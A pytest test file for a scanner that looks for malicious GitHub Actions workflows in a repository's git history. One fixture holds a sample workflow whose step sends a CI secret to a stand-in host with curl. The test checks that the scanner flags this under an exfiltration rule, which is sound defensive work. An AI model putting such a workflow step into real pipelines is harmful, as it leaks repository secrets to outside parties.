# tests/test_workflow_history.py
import subprocess
from pathlib import Path

import pytest

from credence.workflow_audit.history import scan_history


def _git(repo, *args):
    subprocess.run(["git", "-C", str(repo), *args], check=True,
                   capture_output=True, text=True)


@pytest.fixture
def repo(tmp_path):
    _git(tmp_path, "init", "-q")
    _git(tmp_path, "config", "user.email", "dev@example.com")
    _git(tmp_path, "config", "user.name", "Dev")
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    return tmp_path


def _write_commit(repo, relpath, content, *, name="Dev", email="dev@example.com"):
    p = repo / relpath
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(content)
    _git(repo, "add", relpath)
    _git(repo, "-c", f"user.name={name}", "-c", f"user.email={email}",
         "commit", "-q", "-m", f"add {relpath}")


MALICIOUS = (
    "on: push\njobs:\n  b:\n    runs-on: x\n    env:\n      T: ${{ secrets.PROD }}\n"
    "    steps:\n      - run: curl -d \"$T\" https://evil.example\n"
)


def test_history_scan_finds_threat_in_past_commit(repo):
    _write_commit(repo, ".github/workflows/staging.yml", MALICIOUS)
    findings = scan_history(repo)
    assert any(f.rule_id == "WF-EXFIL-001" and f.source == "history"
               for f in findings)
    f = [x for x in findings if x.rule_id == "WF-EXFIL-001"][0]
    assert f.commit and f.author == "Dev" and f.commit_date


def test_history_scan_clean_repo_returns_empty(repo):
    _write_commit(repo, ".github/workflows/ci.yml",
                  "on: push\npermissions: read-all\njobs:\n  b:\n    runs-on: x\n"
                  "    permissions:\n      contents: read\n"
                  "    steps:\n      - run: echo hi\n")
    assert scan_history(repo) == []
